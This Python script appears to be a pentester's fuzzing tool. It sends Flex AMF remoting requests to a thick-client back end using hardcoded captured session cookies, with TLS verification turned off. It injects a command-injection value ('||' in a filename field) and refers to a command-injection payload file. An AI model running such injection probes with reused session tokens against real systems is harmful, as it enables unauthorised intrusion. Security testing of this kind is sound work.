# -*- coding: utf-8 -*-
import pyamf
from pyamf import remoting
from pyamf.flex import messaging
import pyamf.flex as flex
import uuid
import requests
from pyamf.remoting.client import RemotingService
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# payload = {'WE_USERNAME': <username>,
#            'WE_PASSWORD': <password>,
#            'WE_Version': "1.1.0.0",
#            'AUTHTYPE': "PASSWORD"}

# resp = requests.post(<url>,
#                      data=payload,
#                      verify=False
#                      )
# login_header = resp.headers['Set-Cookie'].split(',')
# for iter in login_header:
#     if "SMSESSION" in iter:
#         iter = iter.split(";")
#         session_id = iter[0].split("=")

# Use session_id[1] to get SMSESSION
cookies = {'SMSESSION': "gb/ytGMJTFHo0BxAvT2l7ftDWTiB1GetZavUrOUNLuooypX1H76qOptD/irTMXRX08sV02OsPV9V8FcZM0vzJt4IdbNUcGRLJoFr7mxEpsgPXxgFhQ+z3jyWL2kyN5wFQHJ59eZKwCWMQtoxPovqrj645Stl3wMCkJXYMDZMl0hZPJfgIDFeZinxYBeU3n1aCC+4F1h1Go8f1MtxQr3T9GaF5k0+Gha47ohxlq13//PZi601MGkr8qYFCVmYl+FpKtoqR50Rfi9F9WYfEdCYzarzyOS1nxjgwadi+w4QV1QuxzOzP+eElYpLyHLdB+GdtpTon/l7zaYnWxMwlKMtlfEDfRADeRzg0TWQjJQf0KaJUwq4aCrcex26qXkYxyvtiHKF4qpfZw1LSPAoatT9UdPAo+eiSU8NZxLXzHtUKJ4AekVkXsROlCxl0ZSFP+Nm6/gzfY8MvV/IKKUHBnMAR4WUIuA7MRUrf4fKGFtZ3+VJ3rNHIGDj3uWdOYUQ50UiBtz+KExTiKUYKnDAsQBIl+pU5x8IVamLFdIHawLrZcZcgjMHgpP4MktkzoytWep1/ePU7y8F0msr7NkIeKEx4UlHQ9n4lVMCo9pEYb/XPTYFrv/E/qdmgWNgveESdPAP4N/1cpExexJ6CV7ggbays7sjHcDH/IqEPsI5Npokv6VWt12LfUWJ8jc0m2ymSNn+lg9tBsxi9FFSfVrSg06SOR+lozoXph4g8X2y4jIO6WrPyxvMa7IULadXlSs+q5vE+v0cvXfjpkdq8lM4zGlhcF31KhYLixn0jgvI54ICqE3r8sVzemWR8N3RqAzRava4U4KARcYTkq1YtSD/sfDolqhD+ABo0mQpkbSCt/LQ9fwZZPwx3xgTXcBxCwYmjD4BIOkldVKgZ9tqtmmQGtt4y7iTTVqqsBqmThdKhKNx/Av5JG9bI6zBlNKnWVpEFh7iWtbg6y6nJYWVUE5Orv/rzJ69T6m8CHV21p4WmXMzoQNmLJSPm77ZJjGLcOU4zmoyYWDTaeGXmohjTMXkAP6SEBVCBgihYaQtP1/f+E5ET0+b/oOYZPYSQ4HSEVozn150y8F28EMt/8SQp7nK/7J9Ni9ojZ9PnphMtn/W2x0Tffvl/pjgaSVCJcQlIvoCA8+dR0ICZxb4+p2nFIaP/PJBva6iPI4Mf6ltM/igNaaXlNlhnsKRPS4ZGN+hqQEG1Yvm",
           'JSESSIONID': '351E91A442085896C2C53816A14AE5BA', 'USERSESSIONSTATE': 'active',
           'TS0115c575':'0159fffb66c1ec4a1942cf592911cc1596a5ef6291a951c2b3247c686b3056a89b23c6723dfcb1229da248a28e648c660b2a8c8ebc8742fcc1862fe6b342e78a55c08c3a24a327d6d0e2e5472c57c8bc765f3f58b24ef3b7c374513bdccf6e425d31f4f072',
           'TS01a474b8':'0159fffb66418bb73f8aea070d00c1e65be275e309a0080260df9eaab64adcfc5998fdbf6b9c4f4d185715fc78d4c3254197b62c0846a7eb83b011e2c97b7ec0cc36ff71ec027afe6b64c5ed58b63c32d5e178a59f330206152e5abca1380d7cf014c2d5e129793daf010f535ee170ee227ff729a14b278270073031d3b55c6e7ed3e683dfb6ed8bcdc5292a135ffcc31b1a4c586b65d357ed9c715a9bf5de765a9218a6e8'}
count = 0
response = {}
file_path = r"C:\Thick Client\command_injection_1.txt"
with open(file_path, "r") as fuzz_file:
    # for entries in fuzz_file:
    for entries in range(0,1):
        # msg = messaging.RemotingMessage(operation='getUploadFiles',
        #                                 clientId='6525D474-C40B-310E-5166-1BBAD11DB51D',
        #                                 destination='scheduleUploadDocCommand',
        #                                 messageId=str(uuid.uuid4()).upper(),
        #                                 body=['IRMEHT2'],
        #                                 headers={'DSId': '62A318D7-A719-932E-AAB7-19ED3B5CFA23',
        #                                         'DSEndpoint': 'my-amf', 'DSRequestTimeout': '150'},
        #                                 timeToLive= 0,
        #                                 timestamp=0)

        # updateReportDistributionStatus
        data_array = flex.ArrayCollection([{'docID': '37969668', 'targetID': '42413994', 'reportId': '64035', 'status': 'COMPLETED', 'filename': "FILE || Generic Report.pdf"}])
        msg = messaging.RemotingMessage(operation='updateReportDistributionStatus',
                                  clientId='C747A8F6-9409-0C8F-2BCB-65AF73A43268',
                                  destination='scheduleUploadDocCommand',
                                  messageId=str(uuid.uuid4()).upper(),
                                  body=[data_array],
                                  headers={'DSId': 'C747A362-5B1C-7F78-1CB4-A6FE0D75F959',
                                           'DSEndpoint': 'my-amf', 'DSRequestTimeout': '150'},
                                  timeToLive=0,
                                  timestamp=0)
        req = remoting.Request(target= None, body=[msg])#, msg_2])
        ev = remoting.Envelope(pyamf.AMF3)
        ev['/0'] = req
        # print("\n\n" + str(req))
        # Encode request
        bin_msg = remoting.encode(ev)

        # print("\n<-------------Encoded Request------------------>\n")
        # print(bin_msg.getvalue())

        # Fuzzing Logic
        # Send request; You can use other channels like RTMP
        time.sleep(0.5)
        resp = requests.post(<url>,
                            data=bin_msg.getvalue(),
                            headers={'Content-type': 'application/x-amf'},
                            cookies=cookies,
                            verify=False
                            )
        count += 1
        print(resp.content)
        # try:
        #     resp_msg = remoting.decode(resp.content)
        #     response[entries.strip()] = str(resp_msg.bodies[0][1])
        # except Exception as exp:
        #     print("\n>>>>>>>>>\n", entries.strip())
        #     print(exp)
print("No of Requests Sent: ", format(count))
print("File to be saved: ", format(r"C:\Thick Client\Responses\CI_ex_dest_target_getReportDetails.txt"))
# print(response)
# with open(r"C:\Thick Client\Responses\CI_ex_dest_target_getReportDetails_2.txt", 'w') as fuzz_response:
#     # json.dump(response, fuzz_response)
#     fuzz_response.write(json.dumps(response))